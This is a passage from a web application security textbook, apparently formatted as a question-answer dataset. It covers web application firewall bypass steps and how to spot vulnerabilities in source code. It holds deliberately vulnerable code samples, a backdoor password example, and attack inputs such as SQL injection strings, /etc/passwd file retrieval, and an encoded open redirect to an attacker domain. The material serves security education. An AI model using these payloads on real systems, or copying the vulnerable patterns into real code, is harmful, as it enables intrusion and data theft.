(Chapter 12). For the remaining\nvulnerabilities where a potential attack pattern may be exhibited, several points\noften diminish the usefulness of a web application fi rewall:\nn If the fi rewall follows HTTP specifi cations too closely, it may make\nassumptions about how the application server will handle the request.\nConversely, fi rewall or IDS devices that have their origins in network-\nlayer defenses often do not understand the details of certain HTTP\ntransmission methods.\nn The application server itself may modify user input by decoding it, add-\ning escape characters, or fi ltering out specifi c strings in the course of\nserving a request after it has passed the fi rewall. Many of the attack steps\ndescribed in previous chapters are aimed at bypassing input validation, and\napplication-layer fi rewalls can be susceptible to the same types of attacks.\nn Many fi rewalls and IDSs alert based on specifi c common attack pay-\nloads, not on the general exploitation of a vulnerability. If an attacker\ncan retrieve an arbitrary fi le from the fi lesystem, a request for /manager/\nviewtempl?loc=/etc/passwd is likely to be blocked, whereas a request\nto /manager/viewtempl?loc=/var/log/syslog would not be termed an\nattack, even though its contents may be more useful to an attacker.\ncc1188..iinndddd 669977 88//1199//22001111 1122::1177::5555 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 698\n698 Chapter 18 n Attacking the Application Server\nAt a high level, we do not need to distinguish between a global input vali-\ndation fi lter, host-based agent, or network-based web application fi rewall. The\nfollowing steps apply to all in equal measure.\nHACK STEPS\nThe presence of a web application fi rewall can be deduced using the following\nsteps:\n1. Submit an arbitrary parameter name to the application with a clear attack\npayload in the value, ideally somewhere the application includes the\nname and/or value in the response. If the application blocks the attack,\nthis is probably due to an external defense.\n2. If a variable can be submitted that is returned in a server response, sub-\nmit a range of fuzz strings and encoded variants to identify the behavior\nof the application defenses to user input.\n3. Confirm this behavior by performing the same attacks on variables within\nthe application.\nYou can try the following strings to attempt to bypass a web application\nfi rewall:\n1. For all fuzzing strings and requests, use benign strings for payloads that\nare unlikely to exist in a standard signature database. Giving examples of\nthese is, by definition, not possible. But you should avoid using\n/etc/passwd or /windows/system32/config/sam as payloads for file\nretrieval. Also avoid using terms such as <script> in an XSS attack and\nusingalert() or xss as XSS payloads.\n2. If a particular request is blocked, try submitting the same parameter in a\ndifferent location or context. For instance, submit the same parameter\nin the URL in a GET request, within the body of a POST request, and within\nthe URL in a POST request.\n3. On ASP.NET, also try submitting the parameter as a cookie. The API\nRequest.Params[“foo”] retrieves the value of a cookie named foo if\nthe parameter foo is not found in the query string or message body.\n4. Review all the other methods of introducing user input provided in\nChapter 4, choosing any that are unprotected.\n5. Determine locations where user input is (or can be) submitted in a nonstan-\ndard format such as serialization or encoding. If none are available, build\nthe attack string by concatenation and/or by spanning it across multiple\nvariables. (Note that if the target is ASP.NET, you may be able to use HPP to\nconcatenate the attack using multiple specifications of the same variable.)\nMany organizations that deploy web application fi rewalls or IDSs do not have\nthem specifi cally tested according to a methodology like the one described in this\nsection. As a result, it is often worth persevering in an attack against such devices.\ncc1188..iinndddd 669988 88//1199//22001111 1122::1177::5566 PPMM"
  },
  {
    "input": "Questions",
    "output": "98 Stuttard c18.indd V2 - 07/28/2011 Page 699\nChapter 18 n Attacking the Application Server 699\nSummary\nAs with the other components on which a web application runs, the web server\nrepresents a signifi cant area of attack surface via which an application may be\ncompromised. Defects in an application server can often directly undermine\nan application’s security by giving access to directory listings, source code for\nexecutable pages, sensitive confi guration and runtime data, and the ability to\nbypass input fi lters.\nBecause of the wide variety of application server products and versions,\nlocating web server vulnerabilities usually involves some reconnaissance and\nresearch. However, this is one area in which automated scanning tools can be\nhighly effective at quickly locating known vulnerabilities within the confi gura-\ntion and software of the server you are attacking.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. Under what circumstances does a web server display a directory listing?\n2. What are WebDAV methods used for, and why might they be dangerous?\n3. How can you exploit a web server that is confi gured to act as a web proxy?\n4. What is the Oracle PL/SQL Exclusion List, and how can it be bypassed?\n5. If a web server allows access to its functionality over both HTTP and\nHTTPS, are there any advantages to using one protocol over the other\nwhen you are probing for vulnerabilities?\ncc1188..iinndddd 669999 88//1199//22001111 1122::1177::5566 PPMM\ncc1188..iinndddd 770000 88//1199//22001111 1122::1177::5566 PPMM"
  },
  {
    "input": "Chapter 19 Finding Vulnerabilities in Source Code",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 701\nCHAPTER\n19\nFinding Vulnerabilities\nin Source Code\nSo far, the attack techniques we have described have all involved interacting\nwith a live running application and have largely consisted of submitting crafted\ninput to the application and monitoring its responses. This chapter examines an\nentirely different approach to fi nding vulnerabilities — reviewing the applica-\ntion’s source code.\nIn various situations it may be possible to perform a source code audit to help\nattack a target web application:\nn Some applications are open source, or use open source components,\nenabling you to download their code from the relevant repository and\nscour it for vulnerabilities.\nn If you are performing a penetration test in a consultancy context, the appli-\ncation owner may grant you access to his or her source code to maximize\nthe effectiveness of your audit.\nn You may discover a fi le disclosure vulnerability within an application that\nenables you to download its source code (either partially or in its entirety).\nn Most applications use some client-side code such as JavaScript, which is\naccessible without requiring any privileged access.\nIt is often believed that to carry out a code review, you must be an experi-\nenced programmer and have detailed knowledge of the language being used.\nHowever, this need not be the case. Many higher-level languages can be read\n701\ncc1199..iinndddd 770011 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Black-Box Versus White-Box Testing",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 702\n702 Chapter 19 n Finding Vulnerabilities in Source Code\nand understood by someone with limited programming experience. Also, many\ntypes of vulnerabilities manifest themselves in the same way across all the lan-\nguages commonly used for web applications. The majority of code reviews can\nbe carried out using a standard methodology. You can use a cheat sheet to help\nunderstand the relevant syntax and APIs that are specifi c to the language and\nenvironment you are dealing with. This chapter describes the core methodol-\nogy you need to follow and provides cheat sheets for some of the languages\nyou are likely to encounter.\nApproaches to Code Review\nYou can take a variety of approaches to carrying out a code review to help\nmaximize your effectiveness in discovering security fl aws within the time\navailable. Furthermore, you can often integrate your code review with other\ntest approaches to leverage the inherent strengths of each.\nBlack-Box Versus White-Box Testing\nThe attack methodology described in previous chapters is often described as a\nblack-box approach to testing. This involves attacking the application from the\noutside and monitoring its inputs and outputs, with no prior knowledge of its\ninner workings. In contrast, a white-box approach involves looking inside the\napplication’s internals, with full access to design documentation, source code,\nand other materials.\nPerforming a white-box code review can be a highly effective way to discover\nvulnerabilities within an application. With access to source code, it is often possible\nto quickly locate problems that would be extremely diffi cult or time-consuming\nto detect using only black-box techniques. For example, a backdoor password\nthat grants access to any user account may be easy to identify by reading the\ncode but nearly impossible to detect using a password-guessing attack.\nHowever, code review usually is not an effective substitute for black-box\ntesting. Of course, in one sense, all the vulnerabilities in an application are “in\nthe source code,” so it must in principle be possible to locate all those vulner-\nabilities via code review. However, many vulnerabilities can be discovered more\nquickly and effi ciently using black-box methods. Using the automated fuzzing\ntechniques described in Chapter 14, it is possible to send an application hundreds\nof test cases per minute, which propagate through all relevant code paths and\nreturn a response immediately. By sending triggers for common vulnerabilities\nto every fi eld in every form, it is often possible to fi nd within minutes a mass\nof problems that would take days to uncover via code review. Furthermore,\nmany enterprise-class applications have a complex structure with numerous\ncc1199..iinndddd 770022 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Code Review Methodology",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 703\nChapter 19 n Finding Vulnerabilities in Source Code 703\nlayers of processing of user-supplied input. Different controls and checks are\nimplemented at each layer, and what appears to be a clear vulnerability in one\npiece of source code may be fully mitigated by code elsewhere.\nIn most situations, black-box and white-box techniques can complement and\nenhance each other. Often, having found a prima facie vulnerability through\ncode review, the easiest and most effective way to establish whether it is real\nis to test for it on the running application. Conversely, having identifi ed some\nanomalous behavior on a running application, often the easiest way to inves-\ntigate its root cause is to review the relevant source code. If feasible, therefore,\nyou should aim to combine a suitable mix of black- and white-box techniques.\nAllow the time and effort you devote to each to be guided by the application’s\nbehavior during hands-on testing, and the size and complexity of the codebase.\nCode Review Methodology\nAny reasonably functional application is likely to contain many thousands of\nlines of source code, and in most cases the time available for you to review it is\nlikely to be restricted, perhaps to only a few days. A key objective of effective\ncode review, therefore, is to identify as many security vulnerabilities as pos-\nsible, given a certain amount of time and effort. To achieve this, you must take a\nstructured approach, using various techniques to ensure that the “low-hanging\nfruit” within the codebase is quickly identifi ed, leaving time to look for issues\nthat are more subtle and harder to detect.\nIn the authors’ experience, a threefold approach to auditing a web applica-\ntion codebase is effective in identifying vulnerabilities quickly and easily. This\nmethodology comprises the following elements:\n1. Tracing user-controllable data from its entry points into the application,\nand reviewing the code responsible for processing it.\n2. Searching the codebase for signatures that may indicate the presence\nof common vulnerabilities, and reviewing these instances to determine\nwhether an actual vulnerability exists.\n3. Performing a line-by-line review of inherently risky code to understand\nthe application’s logic and fi nd any problems that may exist within it.\nFunctional components that may be selected for this close review include\nthe key security mechanisms within the application (authentication, session\nmanagement, access control, and any application-wide input validation),\ninterfaces to external components, and any instances where native code\nis used (typically C/C++).\nWe will begin by looking at the ways in which various common web appli-\ncation vulnerabilities appear at the level of source code and how these can be\ncc1199..iinndddd 770033 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Cross-Site Scripting",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 704\n704 Chapter 19 n Finding Vulnerabilities in Source Code\nmost easily identifi ed when performing a review. This will provide a way to\nsearch the codebase for signatures of vulnerabilities (step 2) and closely review\nrisky areas of code (step 3).\nWe will then look at some of the most popular web development languages to\nidentify the ways in which an application acquires user-submitted data (through\nrequest parameters, cookies, and so on). We will also see how an application\ninteracts with the user session, the potentially dangerous APIs that exist within\neach language, and the ways in which each language’s confi guration and envi-\nronment can affect the application’s security. This will provide a way to trace\nuser-controllable data from its entry point to the application (step 1) as well as\nprovide some per-language context to assist with the other methodology steps.\nFinally, we will discuss some tools that are useful when performing code review.\nNOTE When carrying out a code audit, you should always bear in mind\nthat applications may extend library classes and interfaces, may implement\nwrappers to standard API calls, and may implement custom mechanisms for\nsecurity-critical tasks such as storing per-session information. Before launch-\ning into the detail of a code review, you should establish the extent of such\ncustomization and tailor your approach to the review accordingly.\nSignatures of Common Vulnerabilities\nMany types of web application vulnerabilities have a fairly consistent signature\nwithin the codebase. This means that you can normally identify a good por-\ntion of an application’s vulnerabilities by quickly scanning and searching the\ncodebase. The examples presented here appear in various languages, but in\nmost cases the signature is language-neutral. What matters is the programming\ntechnique being employed, more than the actual APIs and syntax.\nCross-Site Scripting\nIn the most obvious examples of XSS, parts of the HTML returned to the user\nare explicitly constructed from user-controllable data. Here, the target of an\nHREF link is constructed using strings taken directly from the query string in\nthe request:\nString link = “<a href=” + HttpUtility.UrlDecode(Request.QueryString\n[“refURL”]) + “&SiteID=” + SiteId + “&Path=” + HttpUtility.UrlEncode\n(Request.QueryString[“Path”]) + “</a>”;\nobjCell.InnerHtml = link;\nThe usual remedy for cross-site scripting, which is to HTML-encode potentially\nmalicious content, cannot be subsequently applied to the resulting concatenated\ncc1199..iinndddd 770044 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "SQL Injection",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 705\nChapter 19 n Finding Vulnerabilities in Source Code 705\nstring, because it already contains valid HTML markup. Any attempt to sanitize\nthe data would break the application by encoding the HTML that the application\nitself has specifi ed. Hence, the example is certainly vulnerable unless fi lters are\nin place elsewhere that block requests containing XSS exploits within the query\nstring. This fi lter-based approach to stopping XSS attacks is often fl awed. If it\nis present, you should closely review it to identify any ways to work around it\n(see Chapter 12).\nIn more subtle cases, user-controllable data is used to set the value of a vari-\nable that is later used to build the response to the user. Here, the class member\nvariable m_pageTitle is set to a value taken from the request query string. It\nwill presumably be used later to create the <title> element within the returned\nHTML page:\nprivate void setPageTitle(HttpServletRequest request) throws\nServletException\n{\nString requestType = request.getParameter(“type”);\nif (“3”.equals(requestType) && null!=request.getParameter(“title”))\nm_pageTitle = request.getParameter(“title”);\nelse m_pageTitle = “Online banking application”;\n}\nWhen you encounter code like this, you should closely review the processing\nsubsequently performed on the m_pageTitle variable. You should see how it is\nincorporated into the returned page to determine whether the data is suitably\nencoded to prevent XSS attacks.\nThe preceding example clearly demonstrates the value of a code review in\nfi nding some vulnerabilities. The XSS fl aw can be triggered only if a different\nparameter (type) has a specifi c value (3). Standard fuzz testing and vulnerability\nscanning of the relevant request may well fail to detect the vulnerability.\nSQL Injection\nSQL injection vulnerabilities most commonly arise when various hard-coded\nstrings are concatenated with user-controllable data to form a SQL query, which\nis then executed within the database. Here, a query is constructed using data\ntaken directly from the request query string:\nStringBuilder SqlQuery = newStringBuilder(“SELECT name, accno FROM\nTblCustomers WHERE “ + SqlWhere);\nif(Request.QueryString[“CID”] != null &&\nRequest.QueryString[“PageId”] == “2”)\n{\nSqlQuery.Append(“ AND CustomerID = “);\ncc1199..iinndddd 770055 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Path Traversal",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 706\n706 Chapter 19 n Finding Vulnerabilities in Source Code\nSqlQuery.Append(Request.QueryString[“CID”].ToString());\n}\n...\nA simple way to quickly identify this kind of low-hanging fruit within the\ncodebase is to search the source for the hard-coded substrings, which are often\nused to construct queries out of user-supplied input. These substrings usually\nconsist of snippets of SQL and are quoted in the source, so it can be profi table to\nsearch for appropriate patterns composed of quotation marks, SQL keywords,\nand spaces. For example:\n“SELECT\n“INSERT\n“DELETE\n“ AND\n“ OR\n“ WHERE\n“ ORDER BY\nIn each case, you should verify whether these strings are being concatenated\nwith user-controllable data in a way that introduces SQL injection vulner-\nabilities. Because SQL keywords are processed in a case-insensitive manner,\nthe searches for these terms should also be case-insensitive. Note that a space\nmay be appended to each of these search terms to reduce the incidence of false\npositives in the results.\nPath Traversal\nThe usual signature for path traversal vulnerabilities involves user-controllable\ninput being passed to a fi lesystem API without any validation of the input or\nverifi cation that an appropriate fi le has been selected. In the most common\ncase, user data is appended to a hard-coded or system-specifi ed directory path,\nenabling an attacker to use dot-dot-slash sequences to step up the directory tree\nto access fi les in other directories. For example:\npublic byte[] GetAttachment(HttpRequest Request)\n{\nFileStream fsAttachment = new FileStream(SpreadsheetPath +\nHttpUtility.UrlDecode(Request.QueryString[“AttachName”]),\nFileMode.Open, FileAccess.Read, FileShare.Read);\nbyte[] bAttachment = new byte[fsAttachment.Length];\nfsAttachment.Read(FileContent, 0,\nConvert.ToInt32(fsAttachment.Length,\nCultureInfo.CurrentCulture));\nfsAttachment.Close();\ncc1199..iinndddd 770066 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Arbitrary Redirection",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 707\nChapter 19 n Finding Vulnerabilities in Source Code 707\nreturn bAttachment;\n}\nYou should closely review any application functionality that enables users\nto upload or download fi les. You need to understand how fi lesystem APIs\nare being invoked in response to user-supplied data and determine whether\ncrafted input can be used to access fi les in an unintended location. Often, you\ncan quickly identify relevant functionality by searching the codebase for the\nnames of any query string parameters that relate to fi lenames (AttachName in the\ncurrent example). You also can search for all fi le APIs in the relevant language\nand review the parameters passed to them. (See later sections for listings of the\nrelevant APIs in common languages.)\nArbitrary Redirection\nVarious phishing vectors such as arbitrary redirects are often easy to spot\nthrough signatures in the source code. In this example, user-supplied data from\nthe query string is used to construct a URL to which the user is redirected:\nprivate void handleCancel()\n{\nhttpResponse.Redirect(HttpUtility.UrlDecode(Request.QueryString[\n“refURL”]) + “&SiteCode=” +\nRequest.QueryString[“SiteCode”].ToString() +\n“&UserId=” + Request.QueryString[“UserId”].ToString());\n}\nOften, you can fi nd arbitrary redirects by inspecting client-side code, which\nof course does not require any special access to the application’s internals.\nHere, JavaScript is used to extract a parameter from the URL query string and\nultimately redirect to it:\nurl = document.URL;\nindex = url.indexOf(‘?redir=’);\ntarget = unescape(url.substring(index + 7, url.length));\ntarget = unescape(target);\nif ((index = target.indexOf(‘//’)) > 0) {\ntarget = target.substring (index + 2, target.length);\nindex = target.indexOf(‘/’);\ntarget = target.substring(index, target.length);\n}\ntarget = unescape(target);\ndocument.location = target;\nAs you can see, the author of this script knew the script was a potential target\nfor redirection attacks to an absolute URL on an external domain. The script\ncc1199..iinndddd 770077 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Backdoor Passwords",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 708\n708 Chapter 19 n Finding Vulnerabilities in Source Code\nchecks whether the redirection URL contains a double slash (as in http://). If it\ndoes, the script skips past the double slash to the fi rst single slash, thereby con-\nverting it into a relative URL. However, the script then makes a fi nal call to the\nunescape() function, which unpacks any URL-encoded characters. Performing\ncanonicalization after validation often leads to a vulnerability (see Chapter 2).\nIn this instance an attacker can cause a redirect to an arbitrary absolute URL\nwith the following query string:\n?redir=http:%25252f%25252fwahh-attacker.com\nOS Command Injection\nCode that interfaces with external systems often contains signatures indicat-\ning code injection fl aws. In the following example, the message and address\nparameters have been extracted from user-controllable form data and are passed\ndirectly into a call to the UNIX system API:\nvoid send_mail(const char *message, const char *addr)\n{\nchar sendMailCmd[4096];\nsnprintf(sendMailCmd, 4096, “echo ‘%s’ | sendmail %s”, message, addr);\nsystem(sendMailCmd);\nreturn;\n}\nBackdoor Passwords\nUnless they have been deliberately concealed by a malicious programmer,\nbackdoor passwords that have been used for testing or administrative purposes\nusually stand out when you review credential validation logic. For example:\nprivate UserProfile validateUser(String username, String password)\n{\nUserProfile up = getUserProfile(username);\nif (checkCredentials(up, password) ||\n“oculiomnium”.equals(password))\nreturn up;\nreturn null;\n}\nOther items that may be easily identifi ed in this way include unreferenced\nfunctions and hidden debug parameters.\ncc1199..iinndddd 770088 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Native Software Bugs",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 709\nChapter 19 n Finding Vulnerabilities in Source Code 709\nNative Software Bugs\nYou should closely review any native code used by the application for classic\nvulnerabilities that may be exploitable to execute arbitrary code.\nBuffer Overfl ow Vulnerabilities\nThese typically employ one of the unchecked APIs for buffer manipulation, of\nwhich there are many, including strcpy,strcat,memcpy, and sprintf, together\nwith their wide-char and other variants. An easy way to identify low-hanging\nfruit within the codebase is to search for all uses of these APIs and verify\nwhether the source buffer is user-controllable. You also should verify whether\nthe code has explicitly ensured that the destination buffer is large enough to\naccommodate the data being copied into it (because the API itself does not do so).\nVulnerable calls to unsafe APIs are often easy to identify. In the following\nexample, the user-controllable string pszName is copied into a fi xed-size stack-\nbased buffer without checking that the buffer is large enough to accommodate it:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)\n{\nchar strFileName[MAX_PATH];\nstrcpy(strFileName, pszName);\n...\n}\nNote that just because a safe alternative to an unchecked API is employed,\nthis is no guarantee that a buffer overfl ow will not occur. Sometimes, due to a\nmistake or misunderstanding, a checked API is used in an unsafe manner, as\nin the following “fi x” of the preceding vulnerability:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName)\n{\nchar strFileName[MAX_PATH];\nstrncpy(strFileName, pszName, strlen(pszName));\n...\n}\nTherefore, a thorough code audit for buffer overfl ow vulnerabilities typically\nentails a close line-by-line review of the entire codebase, tracing every operation\nperformed on user-controllable data.\nInteger Vulnerabilities\nThese come in many forms and can be extremely subtle, but some instances are\neasy to identify from signatures within the source code.\ncc1199..iinndddd 770099 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Source Code Comments",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 710\n710 Chapter 19 n Finding Vulnerabilities in Source Code\nComparisons between signed and unsigned integers often lead to problems.\nIn the following “fi x” to the previous vulnerability, a signed integer (len) is\ncompared with an unsigned integer (sizeof(strFileName)). If the user can\nengineer a situation where len has a negative value, this comparison will suc-\nceed, and the unchecked strcpy will still occur:\nBOOL CALLBACK CFiles::EnumNameProc(LPTSTR pszName, int len)\n{\nchar strFileName[MAX_PATH];\nif (len < sizeof(strFileName))\nstrcpy(strFileName, pszName);\n...\n}\nFormat String Vulnerabilities\nTypically you can identify these quickly by looking for uses of the printf and\nFormatMessage families of functions where the format string parameter is not\nhard-coded but is user-controllable. The following call to fprintf is an example:\nvoid logAuthenticationAttempt(char* username);\n{\nchar tmp[64];\nsnprintf(tmp, 64, “login attempt for: %s\\n”, username);\ntmp[63] = 0;\nfprintf(g_logFile, tmp);\n}\nSource Code Comments\nMany software vulnerabilities are actually documented within source code\ncomments. This often occurs because developers are aware that a particular\noperation is unsafe, and they record a reminder to fi x the problem later, but\nthey never get around to doing so. In other cases, testing has identifi ed some\nanomalous behavior within the application that was commented within the\ncode but never fully investigated. For example, the authors encountered the\nfollowing within an application’s production code:\ncc1199..iinndddd 771100 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Identifying User-Supplied Data",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 711\nChapter 19 n Finding Vulnerabilities in Source Code 711\nchar buf[200]; // I hope this is big enough\n...\nstrcpy(buf, userinput);\nSearching a large codebase for comments indicating common problems is\nfrequently an effective source of low-hanging fruit. Here are some search terms\nthat have proven useful:\nn bug\nn problem\nn bad\nn hope\nn todo\nn fix\nn overflow\nn crash\nn inject\nn xss\nn trust\nThe Java Platform\nThis section describes ways to acquire user-supplied input, ways to interact with\nthe user’s session, potentially dangerous APIs, and security-relevant confi gura-\ntion options on the Java platform.\nIdentifying User-Supplied Data\nJava applications acquire user-submitted input via the javax.servlet.http.\nHttpServletRequest interface, which extends the javax.servlet.ServletRequest\ninterface. These two interfaces contain numerous APIs that web applications\ncan use to access user-supplied data. The APIs listed in Table 19-1 can be used\nto obtain data from the user request.\ncc1199..iinndddd 771111 88//1199//22001111 1122::1188::3344 PPMM"
  },
  {
    "input": "Session Interaction",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 712\n712 Chapter 19 n Finding Vulnerabilities in Source Code\nTable 19-1: APIs Used to Acquire User-Supplied Data on the Java Platform\nAPI DESCRIPTION\ngetParameter Parameters within the URL query string and the body\nof a POST request are stored as a map of String\ngetParameterNames\nnames to String values, which can be accessed\ngetParameterValues using these APIs.\ngetParameterMap\ngetQueryString Returns the entire query string contained within the\nrequest and can be used as an alternative to the\ngetParameter APIs.\ngetHeader HTTP headers in the request are stored as a map\nof String names to String values and can be\ngetHeaders\naccessed using these APIs.\ngetHeaderNames\ngetRequestURI These APIs return the URL contained within the\nrequest, including the query string.\ngetRequestURL\ngetCookies Returns an array of Cookie objects, which contain\ndetails of the cookies received in the request, includ-\ning their names and values.\ngetRequestedSessionId Used as an alternative to getCookies in some\ncases; returns the session ID value submitted within\nthe request.\ngetInputStream These APIs return different representations of the\nraw request received from the client and there-\ngetReader\nfore can be used to access any of the information\nobtained by all the other APIs.\ngetMethod Returns the method used in the HTTP request.\ngetProtocol Returns the protocol used in the HTTP request.\ngetServerName Returns the value of the HTTP Host header.\ngetRemoteUser If the current user is authenticated, these APIs return\ndetails of the user, including his login name. If users\ngetUserPrincipal\ncan choose their own username during self-registra-\ntion, this may be a means of introducing malicious\ninput into the application’s processing.\nSession Interaction\nJava Platform applications use the javax.servlet.http.HttpSession interface\nto store and retrieve information within the current session. Per-session storage\nis a map of string names to object values. The APIs listed in Table 19-2 are used\nto store and retrieve data within the session.\ncc1199..iinndddd 771122 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Potentially Dangerous APIs",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 713\nChapter 19 n Finding Vulnerabilities in Source Code 713\nTable 19-2: APIs Used to Interact with the User’s Session on the Java Platform\nAPI DESCRIPTION\nsetAttribute Used to store data within the current session.\nputValue\ngetAttribute Used to query data stored within the current session.\ngetValue\ngetAttributeNames\ngetValueNames\nPotentially Dangerous APIs\nThis section describes some common Java APIs that can introduce security\nvulnerabilities if used in an unsafe manner.\nFile Access\nThe main class used to access fi les and directories in Java is java.io.File.\nFrom a security perspective, the most interesting uses of this class are calls to\nits constructor, which may take a parent directory and fi lename, or simply a\npathname.\nWhichever form of the constructor is used, path traversal vulnerabilities\nmay exist if user-controllable data is passed as the fi lename parameter without\nchecking for dot-dot-slash sequences. For example, the following code opens a\nfi le in the root of the C:\\ drive on Windows:\nString userinput = “..\\\\boot.ini”;\nFile f = new File(“C:\\\\temp”, userinput);\nThe classes most commonly used for reading and writing fi le contents in\nJava are:\nn java.io.FileInputStream\nn java.io.FileOutputStream\nn java.io.FileReader\nn java.io.FileWriter\nThese classes take a File object in their constructors or may open a fi le\nthemselves via a fi lename string, which may again introduce path traversal\nvulnerabilities if user-controllable data is passed as this parameter. For example:\nString userinput = “..\\\\boot.ini”;\nFileInputStream fis = new FileInputStream(“C:\\\\temp\\\\” + userinput);\ncc1199..iinndddd 771133 88//1199//22001111 1122::1188::3355 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 714\n714 Chapter 19 n Finding Vulnerabilities in Source Code\nDatabase Access\nThe following are the APIs most commonly used for executing an arbitrary\nstring as a SQL query:\nn java.sql.Connection.createStatement\nn java.sql.Statement.execute\nn java.sql.Statement.executeQuery\nIf user-controllable input is part of the string being executed as a query, it is\nprobably vulnerable to SQL injection. For example:\nString username = “admin’ or 1=1--”;\nString password = “foo”;\nStatement s = connection.createStatement();\ns.executeQuery(“SELECT * FROM users WHERE username = “’ + username +\n“’ AND password = “’ + password + “’”);\nexecutes this unintended query:\nSELECT * FROM users WHERE username = ‘admin’ or 1=1--’ AND password = ‘foo’\nThe following APIs are a more robust and secure alternative to the ones previ-\nously described. They allow an application to create a precompiled SQL statement\nand set the value of its parameter placeholders in a secure and type-safe way:\nn java.sql.Connection.prepareStatement\nn java.sql.PreparedStatement.setString\nn java.sql.PreparedStatement.setInt\nn java.sql.PreparedStatement.setBoolean\nn java.sql.PreparedStatement.setObject\nn java.sql.PreparedStatement.execute\nn java.sql.PreparedStatement.executeQuery\nand so on.\nIf used as intended, these are not vulnerable to SQL injection. For example:\nString username = “admin’ or 1=1--”;\nString password = “foo”;\nStatement s = connection.prepareStatement(\n“SELECT * FROM users WHERE username = ? AND password = ?”);\ns.setString(1, username);\ns.setString(2, password);\ns.executeQuery();\ncc1199..iinndddd 771144 88//1199//22001111 1122::1188::3355 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 715\nChapter 19 n Finding Vulnerabilities in Source Code 715\nresults in a query that is equivalent to the following:\nSELECT * FROM users WHERE username = ‘admin’’ or 1=1--’ AND\npassword = ‘foo’\nDynamic Code Execution\nThe Java language itself does not contain any mechanism for dynamic evaluation\nof Java source code, although some implementations (notably within database\nproducts) provide a facility to do this. If the application you are reviewing con-\nstructs any Java code on the fl y, you should understand how this is done and\ndetermine whether any user-controllable data is being used in an unsafe way.\nOS Command Execution\nThe following APIs are the means of executing external operating system com-\nmands from within a Java application:\nn java.lang.runtime.Runtime.getRuntime\nn java.lang.runtime.Runtime.exec\nIf the user can fully control the string parameter passed to exec, the application\nis almost certainly vulnerable to arbitrary command execution. For example,\nthe following causes the Windows calc program to run:\nString userinput = “calc”;\nRuntime.getRuntime.exec(userinput);\nHowever, if the user controls only part of the string passed to exec, the appli-\ncation may not be vulnerable. In the following example, the user-controllable\ndata is passed as command-line arguments to the notepad process, causing it\nto attempt to load a document called | calc:\nString userinput = “| calc”;\nRuntime.getRuntime.exec(“notepad “ + userinput);\nThe exec API itself does not interpret shell metacharacters such as & and |,\nso this attack fails.\nSometimes, controlling only part of the string passed to exec may still be\nsuffi cient for arbitrary command execution, as in the following subtly different\nexample (note the missing space after notepad):\nString userinput = “\\\\..\\\\system32\\\\calc”;\nRuntime.getRuntime().exec(“notepad” + userinput);\ncc1199..iinndddd 771155 88//1199//22001111 1122::1188::3355 PPMM"
  },
  {
    "input": "Configuring the Java Environment",
    "output": "Stuttard c19.indd V2 - 08/11/2011 Page 716\n716 Chapter 19 n Finding Vulnerabilities in Source Code\nOften, in this type of situation, the application is vulnerable to something\nother than code execution. For example, if an application executes the program\nwget with a user-controllable parameter as the target URL, an attacker may\nbe able to pass dangerous command-line arguments to the wget process. For\nexample, the attacker might cause wget to download a document and save it to\nan arbitrary location in the fi lesystem.\nURL Redirection\nThe following APIs can be used to issue an HTTP redirect in Java:\nn javax.servlet.http.HttpServletResponse.sendRedirect\nn javax.servlet.http.HttpServletResponse.setStatus\nn javax.servlet.http.HttpServletResponse.addHeader\nThe usual means of causing a redirect response is via the sendRedirect\nmethod, which takes a string containing a relative or absolute URL. If the value\nof this string is user-controllable, the application is probably vulnerable to a\nphishing vector.\nYou should also be sure to review any uses of the setStatus and addHeader\nAPIs. Given that a redirect simply involves a 3xx response containing an HTTP\nLocation header, an application may implement redirects using these APIs.\nSockets\nThe java.net.Socket class takes various forms of target host and port details\nin its constructors. If the parameters passed are user-controllable in any way,\nthe application may be exploitable to cause network connections to arbitrary\nhosts, either on the Internet or on the private DMZ or internal network on which\nthe application is hosted.\nConfi guring the Java Environment\nThe web.xml fi le contains confi guration settings for the Java Platform environment\nand controls how applications behave. If an application is using container-man-\naged security, authentication and authorization are declared in web.xml against\neach resource or collection of resources to be secured, outside the application\ncode. Table 19-3 shows confi guration options that may be set in the web.xml fi le.\nServlets can enforce programmatic checks with HttpServletRequest.isU-\nserInRole to access the same role information from within the servlet code. A\ncc1199..iinndddd 771166 88//1199//22001111 1122::1188::3355 PPMM\nStuttard c19.indd V2 - 08/11/2011 Page 717\nChapter 19 n Finding Vulnerabilities in Source Code 717\nmapping entry security-role-ref links the built-in role check with the cor-\nresponding container role.\nIn addition to web.xml, different application servers may use secondary deploy-\nment fi les (for example, weblogic.xml) containing other security-relevant settings.\nYou should include these when examining the environment’s confi guration.\nTable 19-3: Security-Relevant Confi guration Settings for the Java Environment\nSETTING DESCRIPTION\nlogin-config Authentication details can be confi gured within the login-\nconfig element.\nThe two categories of authentication are forms-based (the\npage is specifi ed by the form-login-page element) 